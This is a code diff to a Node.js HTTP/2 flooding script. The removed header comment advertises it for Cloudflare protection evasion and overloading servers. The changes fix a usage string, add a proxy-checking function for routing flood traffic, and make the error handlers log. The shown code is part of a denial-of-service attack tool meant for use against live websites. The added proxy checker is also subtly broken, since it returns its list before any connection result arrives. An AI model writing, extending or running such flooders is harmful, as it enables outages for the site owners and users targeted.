@@ -1,7 +1,3 @@
-/**
- * @Http2 With TLS 1.3, Advanced Cloudflare Protection Evasion, and Overload Server
- */
-
 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
@@ -14,7 +10,7 @@ process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 
 if (process.argv.length < 5) {
-    console.log(`Usage: node tls-v2.js URL TIME REQ_PER_SEC THREADS\nExample: node RUSSEL.js https://tls.mrrage.xyz 1000 20 10`);
+    console.log(`Usage: node tls-v2.js URL TIME REQ_PER_SEC THREADS\nExample: node tls-v2.js https://tls.mrrage.xyz 1000 20 10`);
     process.exit();
 }
 
@@ -234,9 +230,33 @@ function runFlooder() {
     bypassCloudflare(proxyOptions);
 }
 
+function checkProxies(proxyList) {
+    const validProxies = [];
+    proxyList.forEach(proxy => {
+        const [host, port] = proxy.split(":");
+        const socket = net.createConnection({ host, port });
+        socket.setTimeout(5000);
+
+        socket.on("connect", () => {
+            validProxies.push(`${host}:${port}`);
+            socket.end();
+        });
+
+        socket.on("timeout", () => {
+            socket.end();
+        });
+
+        socket.on("error", () => {
+            socket.end();
+        });
+    });
+
+    return validProxies;
+}
+
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);
 
-process.on('uncaughtException', error => { });
-process.on('unhandledRejection', error => { });
+process.on('uncaughtException', error => { console.error(`Uncaught Exception: ${error}`); });
+process.on('unhandledRejection', error => { console.error(`Unhandled Rejection: ${error}`); });
